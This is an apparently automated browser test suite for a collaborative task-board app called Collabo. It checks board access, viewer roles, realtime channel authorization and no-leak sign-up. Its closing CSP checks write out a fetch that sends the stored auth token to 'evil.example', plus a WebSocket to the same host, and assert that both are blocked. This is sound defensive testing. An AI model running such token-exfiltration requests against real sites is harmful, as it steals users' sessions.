// Who can see and do what: boards, roles, realtime, channel authorization, CSP,
// and sign-up that does not reveal which addresses have accounts.
import { readFileSync } from 'node:fs';
import { URLS } from '../lib/stack.mjs';
import { addTask, apiFromPage, isVisible, recordCspViolations, signUp } from '../lib/browser.mjs';
import { waitFor } from '../lib/check.mjs';

export const name = 'tenancy, roles, realtime, CSP';

export async function run({ stack, browser, check }) {
  const aliceCtx = await browser.newContext();
  const bobCtx = await browser.newContext();
  await recordCspViolations(aliceCtx);
  await recordCspViolations(bobCtx);
  const alice = await aliceCtx.newPage();
  const bob = await bobCtx.newPage();
  const pageErrors = [];
  alice.on('pageerror', (e) => pageErrors.push(String(e)));

  // ---- Alice signs up and lands on her own board
  await signUp(stack, alice, 'Alice Adams', 'alice@example.com');
  const aliceBoard = alice.url();
  check('verifying an email lands on the user\'s own board', /\/boards\/\d+$/.test(aliceBoard), aliceBoard);
  await alice.getByRole('button', { name: /Alice Adams's board/ }).waitFor({ timeout: 10000 });
  check('the top bar shows the board name in a switcher', true);

  check('owner can create a task', (await addTask(alice, 'Ship boards')) === 201);
  await alice.reload();
  check('the task persists after a reload', await waitFor(() => isVisible(alice, 'Ship boards'), 15000));

  // ---- Bob has his own board and cannot reach Alice's
  await signUp(stack, bob, 'Bob Brown', 'bob@example.com');
  check('a second user gets a different board', bob.url() !== aliceBoard, bob.url());
  await bob.goto(aliceBoard);
  await bob.getByText(/doesn't exist, or you aren't on it/).waitFor({ timeout: 10000 });
  check("a non-member is told the board doesn't exist, or they aren't on it", true);
  check("a non-member never sees the other board's tasks", (await bob.getByText('Ship boards').count()) === 0);

  // ---- Signing up again with Alice's address reveals nothing and changes nothing
  const dupCtx = await browser.newContext();
  const dup = await dupCtx.newPage();
  await dup.goto(`${URLS.web}/signup`);
  await dup.getByLabel('Full name').fill('Impostor');
  await dup.getByLabel('Email').fill('alice@example.com');
  await dup.getByLabel('Password', { exact: true }).fill('different123');
  await dup.getByLabel('Confirm password').fill('different123');
  await dup.getByRole('button', { name: /create account|sign up/i }).click();
  await dup.waitForURL(/verify-otp/, { timeout: 10000 });
  check('signing up with an existing address looks like any other sign-up', true);
  await dup.waitForTimeout(500);
  const mailLog = readFileSync(stack.mailLogPath(), 'utf8');
  check('the existing owner is emailed that they already have an account', mailLog.includes('You already have a Collabo account') && mailLog.includes('To: alice@example.com'));
  const login = await apiFromPage(alice, '/api/auth/login', { method: 'POST', body: JSON.stringify({ email: 'alice@example.com', password: 'secret123' }) });
  check("the impostor's password did not replace Alice's", login.status === 200);
  await dupCtx.close();

  // ---- Alice adds Bob as a viewer
  await alice.goto(`${aliceBoard}/members`);
  await alice.getByLabel('Email').fill('bob@example.com');
  await alice.getByLabel('Role for new member').selectOption('viewer');
  await alice.getByRole('button', { name: 'Add', exact: true }).click();
  await alice.getByText('Bob Brown').waitFor({ timeout: 10000 });
  check('the owner can add a member by email', true);
  await alice.getByLabel('Email').fill('nobody@example.com');
  await alice.getByRole('button', { name: 'Add', exact: true }).click();
  await alice.getByText('No account with that email.').waitFor({ timeout: 10000 });
  check('adding an unknown address shows an inline error', true);

  // ---- Bob, as a viewer, sees the board read-only
  await bob.goto(aliceBoard);
  check('a viewer can see the tasks', await waitFor(() => isVisible(bob, 'Ship boards'), 15000));
  await bob.waitForTimeout(500);
  check('a viewer has no add-task controls', (await bob.getByRole('button', { name: /Add task to/ }).count()) === 0);
  await bob.getByRole('button', { name: /Alice Adams's board/ }).click();
  const both = (await bob.getByRole('menuitem', { name: /Alice Adams's board/ }).count()) === 1
    && (await bob.getByRole('menuitem', { name: /Bob Brown's board/ }).count()) === 1;
  check("the switcher lists every board the user is on", both);
  await bob.keyboard.press('Escape');

  // ---- Realtime: Alice adds a task, Bob sees it without reloading
  await alice.goto(aliceBoard);
  await bob.getByText(/online/).waitFor({ timeout: 15000 });
  check('realtime: a task Alice adds appears for Bob with no reload', (await addTask(alice, 'Live task')) === 201 && (await waitFor(() => isVisible(bob, 'Live task'), 15000)));

  // ---- Channel authorization, and the API refusing what the UI hides
  const carolCtx = await browser.newContext();
  const carol = await carolCtx.newPage();
  await signUp(stack, carol, 'Carol Clark', 'carol@example.com');
  const aliceId = aliceBoard.split('/boards/')[1];
  const authorize = (page, channel) =>
    apiFromPage(page, '/broadcasting/auth', { method: 'POST', body: JSON.stringify({ socket_id: '123.456', channel_name: channel }) });
  check('channel auth: a non-member is refused the private channel', (await authorize(carol, `private-board.${aliceId}`)).status === 403);
  check('channel auth: a non-member is refused the presence channel', (await authorize(carol, `presence-board.${aliceId}`)).status === 403);
  check('channel auth: a viewer member is allowed', (await authorize(bob, `private-board.${aliceId}`)).status === 200);
  check('the API refuses a viewer creating a task (403)', (await apiFromPage(bob, `/api/boards/${aliceId}/tasks`, { method: 'POST', body: JSON.stringify({ title: 'sneaky' }) })).status === 403);

  // ---- Task detail resolves its board
  await bob.goto(aliceBoard);
  await bob.getByText('Ship boards').first().click({ force: true }); // dnd-kit marks a read-only card aria-disabled
  await bob.waitForURL(/\/tasks\/\d+/);
  await bob.getByLabel('Task title').waitFor({ timeout: 10000 });
  check('the task page opens for a viewer', true);
  check('the viewer\'s task title is read-only', await bob.getByLabel('Task title').evaluate((el) => el.readOnly));
  check('the viewer has no delete button', (await bob.getByRole('button', { name: /^Delete$/ }).count()) === 0);
  const back = await bob.getByRole('link', { name: /Board/ }).first().getAttribute('href');
  check("the back link returns to the task's board", back === new URL(aliceBoard).pathname, back);

  await bob.goto(`${URLS.web}/`);
  await bob.waitForURL(/\/boards\/\d+$/, { timeout: 10000 });
  check("'/' returns to the last board used", bob.url() === aliceBoard, bob.url());

  // ---- Content-Security-Policy: quiet in normal use, and it really blocks exfiltration
  const violations = [...(await alice.evaluate(() => window.__csp)), ...(await bob.evaluate(() => window.__csp))];
  check('CSP: no violations during normal use (including the Reverb socket)', violations.length === 0, JSON.stringify(violations).slice(0, 200));
  const exfil = await alice.evaluate(async () => {
    try { await fetch(`https://evil.example/steal?t=${localStorage.getItem('collabo:token')}`); return 'sent'; } catch { return 'blocked'; }
  });
  const blocked = (await alice.evaluate(() => window.__csp)).some((v) => v.startsWith('connect-src') && v.includes('evil.example'));
  check('CSP: sending the stored token to a foreign server is blocked', exfil === 'blocked' && blocked);
  const socket = await alice.evaluate(() => new Promise((resolve) => {
    try { const w = new WebSocket('ws://evil.example:9999'); w.onerror = () => resolve('blocked'); w.onopen = () => resolve('open'); } catch { resolve('blocked'); }
  }));
  check('CSP: a WebSocket to a foreign origin is blocked', socket === 'blocked');
  check('no uncaught page errors', pageErrors.length === 0, pageErrors.slice(0, 2).join(' | '));
}
